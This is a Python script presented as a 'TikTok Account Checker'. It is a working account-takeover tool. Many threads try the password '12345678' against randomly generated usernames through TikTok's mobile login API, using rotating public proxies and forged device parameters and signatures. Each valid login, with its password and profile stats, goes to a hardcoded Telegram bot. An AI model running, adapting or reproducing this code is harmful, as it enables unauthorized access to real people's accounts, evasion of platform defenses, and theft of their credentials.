import datetime
import json
import os
import random
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor

import requests
from bs4 import BeautifulSoup

try:
    import SignerPy
except ImportError:
    print("SignerPy not found. Installing...")
    # Use pip to install the dependency if it's missing
    os.system(f'{os.sys.executable} -m pip install SignerPy --no-warn-script-location')
    import SignerPy


class TikTokChecker:
    """
    A class to check TikTok accounts using a multi-threaded approach,
    with organized code, thread-safe statistics, and efficient processing.
    """

    def __init__(self, threads=50):
        # General state and configuration
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.threads = threads

        # Proxies are loaded once at the beginning
        self.proxies = []
        self.load_proxies()

        # Statistics counters, initialized for clarity
        self.total_checked = 0
        self.hits = 0
        self.bad = 0
        self.retries = 0
        self.banned = 0
        self.info_sent = 0

        # Detailed statistics for successful hits
        self.stats = {
            "coins": 0,
            "verified": 0,
            "followers": {
                "0": 0, "Very_Low": 0, "Low": 0, "Medium": 0,
                "High": 0, "Very_High": 0, "Top": 0, "Celebrity": 0
            }
        }

        # Telegram configuration
        self.telegram_token = '8098915126:AAHp3J9Gc9ShOAtCnmA4fGyv-_Z7VLz-x1Q'
        self.telegram_chat_id = '6897603865'

    def load_proxies(self, proxy_url='https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt'):
        """Loads a list of proxies from a URL."""
        try:
            print("Loading proxies...")
            response = requests.get(proxy_url, timeout=10)
            response.raise_for_status()
            self.proxies = response.text.splitlines()
            print(f"Successfully loaded {len(self.proxies)} proxies.")
        except requests.exceptions.RequestException as e:
            print(f"Warning: Could not load proxies. Continuing without them. Error: {e}")
            self.proxies = []

    def _get_random_proxy(self):
        """Selects a random proxy from the loaded list."""
        if not self.proxies:
            return None
        proxy = random.choice(self.proxies)
        return {'http': f"http://{proxy}", 'https': f"http://{proxy}"}

    def _send_telegram_message(self, message_text):
        """Sends a formatted message to the configured Telegram chat."""
        if not all([message_text, self.telegram_token, self.telegram_chat_id]):
            return False

        url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
        payload = {'chat_id': self.telegram_chat_id, 'text': message_text, 'parse_mode': 'Markdown'}
        try:
            response = requests.post(url, json=payload, timeout=10)
            return response.status_code == 200
        except requests.exceptions.RequestException:
            return False

    def _update_display(self):
        """Prints the current statistics to the console in a clean format."""
        elapsed_time = time.strftime("%H:%M:%S", time.gmtime(time.time() - self.start_time))

        # The lock ensures that the print output is not garbled by multiple threads
        with self.lock:
            stats_display = f"""
\r{'═'*12}╡ Checker TikTok ╞{'═'*12}
\rElapsed Time: {elapsed_time}
\rTotal Checked: {self.total_checked} | Hits: {self.hits} | Bad: {self.bad} | Retries: {self.retries}
\r{'═'*12}╡ Account Stats ╞{'═'*13}
\rFollowers (<1k): {self.stats['followers']['Very_Low']} | Followers (1k-10k): {self.stats['followers']['Low']}
\rVerified: {self.stats['verified']} | Info Sent: {self.info_sent}
\r{'═'*40}
"""
            print(stats_display, end="")

    def _update_follower_category_stats(self, category):
        """Thread-safely updates the follower category statistics."""
        if category in self.stats['followers']:
            with self.lock:
                self.stats['followers'][category] += 1

    @staticmethod
    def _get_follower_category(followers_count):
        """Categorizes a user based on their follower count."""
        if followers_count <= 0: return "0"
        if followers_count < 1000: return 'Very_Low'
        if followers_count < 10000: return "Low"
        if followers_count < 50000: return "Medium"
        if followers_count < 100000: return "High"
        if followers_count < 500000: return "Very_High"
        if followers_count < 1000000: return "Top"
        return "Celebrity"

    @staticmethod
    def _format_number(value):
        """Formats a number into a compact, human-readable string (e.g., 1.5k, 2.1M)."""
        value = float(value)
        if value >= 1_000_000: return f"{value / 1_000_000:.1f}M"
        if value >= 1_000: return f"{value / 1_000:.1f}k"
        return str(int(value))

    def _get_account_info(self, username):
        """Scrapes a user's public profile for details after a successful hit."""
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Safari/537.36"}
        try:
            response = requests.get(f'https://www.tiktok.com/@{username}', headers=headers, timeout=10)
            if response.status_code != 200: return None

            soup = BeautifulSoup(response.text, 'html.parser')
            script_tag = soup.find('script', id='__UNIVERSAL_DATA_FOR_REHYDRATION__')
            if not script_tag: return None

            json_data = json.loads(script_tag.string)
            user_module = json_data.get('__DEFAULT_SCOPE__', {}).get('webapp.user-detail', {}).get('userInfo', {})

            user = user_module.get('user', {})
            stats = user_module.get('stats', {})
            followers_count = stats.get('followerCount', 0)

            self._update_follower_category_stats(self._get_follower_category(followers_count))
            if user.get('verified', False):
                with self.lock:
                    self.stats['verified'] += 1

            create_time = datetime.datetime.utcfromtimestamp(user.get('createTime', 0)).strftime('%Y-%m-%d') if user.get('createTime') else 'N/A'

            return {
                'nickname': user.get('nickname', 'N/A'),
                'followers': self._format_number(followers_count),
                'likes': self._format_number(stats.get('heartCount', 0)),
                'create_time': create_time,
                'verified': 'Yes' if user.get('verified', False) else 'No'
            }
        except Exception:
            return None

    def _process_response(self, response, username, password):
        """Processes the API response to check for a valid login."""
        with self.lock:
            self.total_checked += 1

        text = response.text.lower()

        if '"message":"success"' in text and '"data":null' in text:
            with self.lock:
                self.hits += 1

            info = self._get_account_info(username) or {}

            message = (
                f"✅ *Valid TikTok Account Found!*\n\n"
                f"› *Username:* `{username}`\n"
                f"› *Password:* `{password}`\n"
                f"› *Followers:* {info.get('followers', 'N/A')}\n"
                f"› *Likes:* {info.get('likes', 'N/A')}\n"
                f"› *Verified:* {info.get('verified', 'N/A')}\n"
                f"› *Creation Date:* {info.get('create_time', 'N/A')}"
            )

            if self._send_telegram_message(message):
                with self.lock:
                    self.info_sent += 1

        elif "incorrect" in text or "doesn't match" in text:
            with self.lock: self.bad += 1
        elif "limit" in text or "attempts" in text:
            with self.lock: self.retries += 1
        else:
            with self.lock: self.bad += 1

        self._update_display()

    def login_worker(self):
        """The main worker task that runs in a loop for each thread."""
        while True:
            try:
                username = "".join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(random.randint(4, 7)))
                password = '12345678' # The password to test

                session = requests.Session()
                proxies = self._get_random_proxy()

                # --- Generate Device and API Parameters ---
                device_type = random.choice(["SM-S908E", "SM-G991B", "Pixel 6 Pro"])
                base_params = {
                    "device_platform": "android", "aid": "1233", "channel": "googleplay",
                    "app_name": "musical_ly", "version_code": "370805", "version_name": "37.8.5",
                    "device_id": str(random.randint(7*10**18, 8*10**18-1)),
                    "iid": str(random.randint(7*10**18, 8*10**18-1)),
                    "cdid": str(uuid.uuid4()), "openudid": os.urandom(8).hex(),
                    "ts": str(int(time.time())), "_rticket": str(time.time() * 1000),
                    "device_type": device_type, "os_version": "9",
                }

                # --- API Step 1: Account Lookup ---
                lookup_params = base_params.copy()
                lookup_params["account_param"] = "".join([hex(ord(c) ^ 5)[2:] for c in username])

                signed_lookup = SignerPy.sign(params=lookup_params, cookie=session.cookies)
                headers = signed_lookup['headers']

                resp_lookup = session.post(
                    "https://api32-normal-alisg.tiktokv.com/passport/account_lookup/username/",
                    headers=headers, params=lookup_params, proxies=proxies, timeout=10
                )
                resp_lookup.raise_for_status()

                lookup_data = resp_lookup.json()
                if not lookup_data.get("data") or not lookup_data["data"].get("accounts"):
                    with self.lock: self.bad += 1
                    self._update_display()
                    continue
                passport_ticket = lookup_data["data"]["accounts"][0]["passport_ticket"]

                # --- API Step 2: Login by Passport Ticket ---
                login_params = base_params.copy()
                login_params["passport_ticket"] = passport_ticket

                signed_login = SignerPy.sign(params=login_params, cookie=session.cookies)
                headers.update(signed_login['headers'])

                resp_login = session.post(
                    "https://api32-normal-alisg.tiktokv.com/passport/user/login_by_passport_ticket/",
                    headers=headers, params=login_params, proxies=proxies, timeout=10
                )
                resp_login.raise_for_status()

                login_data = json.loads(resp_login.headers['X-Tt-Verify-Idv-Decision-Conf'])
                passport_ticket2 = login_data["passport_ticket"]
                pseudo_id = login_data["extra"][1]["pseudo_id"]

                # --- API Step 3: Authenticate with Password ---
                encrypted_password = "".join([hex(ord(c) ^ 5)[2:] for c in password])
                auth_params = base_params.copy()
                auth_params.update({"passport_ticket": passport_ticket2, "pseudo_id": pseudo_id, "password": encrypted_password})

                auth_payload = {'password': encrypted_password, 'pseudo_id': pseudo_id, 'passport_ticket': passport_ticket2}

                signed_auth = SignerPy.sign(params=auth_params, cookie=session.cookies, payload=auth_payload)
                headers.update(signed_auth['headers'])

                resp_auth = session.post(
                    "https://api16-normal-c-alisg.tiktokv.com/passport/aaas/authenticate/",
                    data=signed_auth['payload'], headers=headers, params=auth_params, proxies=proxies, timeout=10
                )

                self._process_response(resp_auth, username, password)

            except Exception:
                with self.lock:
                    self.bad += 1
                self._update_display()
                time.sleep(1) # Pause to avoid overwhelming the API on repeated errors
                continue

def main():
    """Main function to configure and start the checker."""
    os.system('cls' if os.name == 'nt' else 'clear')
    print("TikTok Account Checker".center(40, '═'))
    try:
        threads = int(input("Enter number of threads (e.g., 50): "))
    except ValueError:
        threads = 50
        print("Invalid input. Defaulting to 50 threads.")

    checker = TikTokChecker(threads=threads)

    print(f"\nStarting checker with {threads} threads. Press Ctrl+C to stop.")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        # Start one long-running worker task for each thread
        for _ in range(threads):
            executor.submit(checker.login_worker)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nChecker stopped by user. Exiting.")
        os._exit(0)
